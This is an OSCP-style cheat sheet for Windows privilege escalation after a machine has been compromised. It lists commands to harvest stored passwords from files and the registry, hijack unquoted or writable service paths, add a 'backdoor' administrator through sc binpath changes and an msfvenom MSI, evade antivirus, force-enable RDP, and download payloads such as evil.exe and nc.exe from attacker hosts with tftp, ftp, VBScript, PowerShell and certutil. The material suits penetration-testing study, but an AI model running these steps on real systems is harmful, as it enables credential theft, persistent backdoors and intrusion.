OSCP - Windows Priviledge Escalation
Information Gathering
+ What system are we connected to?

systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

+ Get the hostname and username (if available)

hostname
echo %username%

+ Learn about your environment

SET
echo %PATH%

+ List other users on the box

net users
net user <username>

+ Networking/Routing Info

ipconfig /all
route print
arp -A

+ Active Network Connections

netstat -ano

+ Firewall Status (only on Win XP SP2 and above)

netsh firewall show state
netsh firewall show config
netsh advfirewall firewall show rule all

+ Scheduled tasks

schtasks /query /fo LIST /v

+ Check how Running processes link to started services

tasklist /SVC       

+ Windows services that are started:

net start

+ Driver madness (3rd party drivers may have holes)

DRIVERQUERY

+ Check systeminfo output against exploit-suggester

https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py
python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt

+ Run windows-privesc script

https://github.com/pentestmonkey/windows-privesc-check

WMIC
Windows Management Instrumentation Command Line
Windows XP requires admin
+ Use wmic_info.bat script for automation

http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar


+ System Info

wmic COMPUTERSYSTEM get TotalPhysicalMemory,caption
wmic CPU Get /Format:List

+ Check patch level

wmic qfe get Caption,Description,HotFixID,InstalledOn

   Look for privilege escalation exploits and look up their respective KB patch numbers. Such exploits include, but are not limited to, KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799)
   After enumerating the OS version and Service Pack you should find out which privilege escalation vulnerabilities could be present. Using the KB patch numbers you can grep the installed patches to see if any are missing
   Search patches for given patch

   wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."

   Examples:

Windows 2K SP4 - Windows 7 (x86): KiTrap0D (KB979682)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB979682"  

Windows Vista/2008 6.1.6000 x32,Windows Vista/2008 6.1.6001 x32,Windows 7 6.2.7600 x32,Windows 7/2008 R2 6.2.7600 x64. (no good exploit - unlikely Microsoft Windows Vista/7 - Elevation of Privileges (UAC Bypass))

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2393802"

Stored Credentials

   Directories that contain the configuration files (however better check the entire filesystem). These files either contain clear-text passwords or in a Base64 encoded format.

   C:\sysprep.inf
   C:\sysprep\sysprep.xml
   %WINDIR%\Panther\Unattend\Unattended.xml
   %WINDIR%\Panther\Unattended.xml

   When the box is connected to a Domain:
       Look for Groups.xml in SYSVOL
       GPO preferences can be used to create local users on domain. So passwords might be stored there. Any authenticated user will have read access to this file. The passwords is encryptes with AES. But the static key is published on the msdn website. Thus it can be decrypted.
       Search for other policy preference files that can have the optional “cPassword” attribute set:

       Services\Services.xml: Element-Specific Attributes
       ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
       Printers\Printers.xml: SharedPrinter Element
       Drives\Drives.xml: Element-Specific Attributes
       DataSources\DataSources.xml: Element-Specific Attributes

   Automated Tools
       Metasploit Module

       post/windows/gather/credentials/gpp
       post/windows/gather/enum_unattend

       Powersploit

       https://github.com/PowerShellMafia/PowerSploit
       Get-GPPPassword
       Get-UnattendedInstallFile
       Get-Webconfig
       Get-ApplicationHost
       Get-SiteListPassword
       Get-CachedGPPPassword
       Get-RegistryAutoLogon

   Search filesystem:
       Search for specific keywords:

       dir /s *pass* == *cred* == *vnc* == *.config*

       Search certain file types for a keyword

       findstr /si password *.xml *.ini *.txt

       Search for certain files

       dir /b /s unattend.xml
       dir /b /s web.config
       dir /b /s sysprep.inf
       dir /b /s sysprep.xml
       dir /b /s *pass*
       dir /b /s vnc.ini

       Grep the registry for keywords (e.g. “passwords”)

       reg query HKLM /f password /t REG_SZ /s
       reg query HKCU /f password /t REG_SZ /s
       reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
       reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
       reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
       reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

       Find writeable files

       dir /a-r-d /s /b

           /a is to search for attributes. In this case r is read only and d is directory. The minus signs negate those attributes. So we're looking for writable files only.
           /s means recurse subdirectories
           /b means bare format. Path and filename only.

Trusted Service Paths

   List all unquoted service paths (minus built-in Windows services) on our compromised machine:

   wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

   Suppose we found:

   C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe

   If you look at the registry entry for this service with Regedit you can see the ImagePath value is:

   C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe

   To be secure it should be like this:

   “C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe”

   When Windows attempts to run this service, it will look at the following paths in order and will run the first EXE that it will find:

   C:\Program.exe
   C:\Program Files.exe
   C:\Program Files(x86)\Program Folder\A.exe
   ...

   Check permissions of folder path

   icacls "C:\Program Files (x86)\Program Folder"

   If we can write in the path we plant a backdoor with the same name with the service and restart the service.

Metasploit module:

exploit/windows/local/trusted_service_path

Vulnerable Services
Search for services that have a binary path (binpath) property which can be modified by non-Admin users - in that case change the binpath to execute a command of your own.
Note: Windows XP shipped with several vulnerable built-in services.
Use accesschk from SysInternals to search for these vulnerable services.

https://technet.microsoft.com/en-us/sysinternals/bb842062.aspx

For Windows XP, version 5.2 of accesschk is needed:

https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe

accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
accesschk.exe -qdws Users C:\Windows\

Then query the service using Windows sc:

sc qc <vulnerable service name>

Then change the binpath to execute your own commands (restart of the service will most likely be needed):

sc config <vuln-service> binpath= "net user backdoor backdoor123 /add"
sc stop <vuln-service>
sc start <vuln-service>
sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add"
sc stop <vuln-service>
sc start <vuln-service>

Note - Might need to use the depend attribute explicitly:

sc stop <vuln-service>
sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
sc start <vuln-service>

Metasploit module:

exploit/windows/local/service_permissions

AlwaysInstallElevated
AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.
Check if these 2 registry values are set to “1”:

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

If they are, create your own malicious msi:

msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi

Then use msiexec on victim to execute your msi:

msiexec /quiet /qn /i C:\evil.msi

Metasploit module:

exploit/windows/local/always_install_elevated

Bypassing AV

   Use Veil-Evasion
   Create your own executable by “compiling” PowerShell scripts
   Use Metasploit to substitute custom EXE and MSI binaries. You can set EXE::Custom or MSI::Custom to point to your binary prior to executing the module.

Getting GUI
+ Using meterpreter, inject vnc session:

run post/windows/manage/payload_inject payload=windows/vncinject/reverse_tcp lhost=<yourip> options=viewonly=false

+ Enable RDP:

netsh firewall set service RemoteDesktop enable

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t
REG_DWORD /d 0 /f
reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f

sc config TermService start= auto
net start Termservice
netsh.exe
firewall
add portopening TCP 3389 "Remote Desktop"

OR:

netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the
Remote Desktop service to allow RDP traffic. [TCP 3389] added by LogicDaemon's script" enable=yes
profile=private,domain localport=3389 protocol=tcp

netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (UDP-In)" dir=in action=allow
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the
Remote Desktop service to allow RDP traffic. [UDP 3389] added by LogicDaemon's script" enable=yes
profile=private,domain localport=3389 protocol=udp

OR (meterpreter)

run post/windows/manage/enable_rdp

https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/
Python exploits
Compiling Python Exploits for Windows on Linux

   install pyinstaller of windows with wine on Kali and then

   wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile 18176.py

   run `pyinstaller` located under the same directory as Python scripts

   wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile HelloWorld.py

   Execute with wine

   wine ~/.wine/drive_c/dist/HelloWorld.exe

File Transfers
limit commands on shell to be non-interactive
https://blog.netspi.com/15-ways-to-download-a-file/
TFTP
Windows XP and Win 2003 contain tftp client. Windows 7 do not by default
tfpt clients are usually non-interactive, so they could work through an obtained shell

atftpd --daemon --port 69 /tftp

Windows> tftp -i 192.168.30.45 GET nc.exe

FTP
Windows contain FTP client but they are usually interactive
Solution: scripted parameters in ftp client: ftp -s
ftp-commands

echo open 192.168.30.5 21> ftp.txt
echo USER username password >> ftp.txt
echo bin >> ftp.txt
echo GET evil.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt

VBScript
wget-vbs script echo trick again, copy paste the commands in the shell

echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

cscript wget.vbs http://10.11.0.102/evil.exe test.txt

Powershell

echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://10.11.0.102/powerup.ps1" >>wget.ps1
echo $file = "powerup.ps1" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

Webdav
On kali linux install wsgidav and cheroot

pip install wsgidav cheroot

Start the wsgidav on a restricted folder:

mkdir /tmp/webdav_folder
wsgidav --host=0.0.0.0 --port=80 --root=/tmp/webdav_folder

On Windows mount this folder using net use:

net use * http://YOUR_IP_ADDRESS/

Reference: https://github.com/mar10/wsgidav
BitsAdmin

bitsadmin /transfer n http://domain/file c:%homepath%file

debug.exe
First use upx or similar to compress the executable:

upx -9 nc.exe

Then use exe2bat to convert the executable into a series of echo commands that are meant to be copied pasted in the remote system:

wine exe2bat.exe nc.exe nc.txt

Then copy paste each command from nc.txt in the remote system. The commands will gradually rebuild the executable in the target machine.
certuril

certutil.exe -URL

will fetch ANY file and download it here:

C:\Users\subTee\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content

Resources
https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py
http://www.fuzzysecurity.com/tutorials/16.html
http://www.greyhathacker.net/?p=738
https://toshellandback.com/2015/11/24/ms-priv-esc/
https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/
https://www.toshellandback.com/2015/08/30/gpp/
https://www.toshellandback.com/2015/09/30/anti-virus/
https://www.veil-framework.com/framework/veil-evasion/
https://www.toshellandback.com/2015/11/24/ms-priv-esc/
https://null-byte.wonderhowto.com/how-to/hack-like-pro-use-powersploit-part-1-evading-antivirus-software-0165535/
https://pentestlab.blog/2017/04/19/stored-credentials/
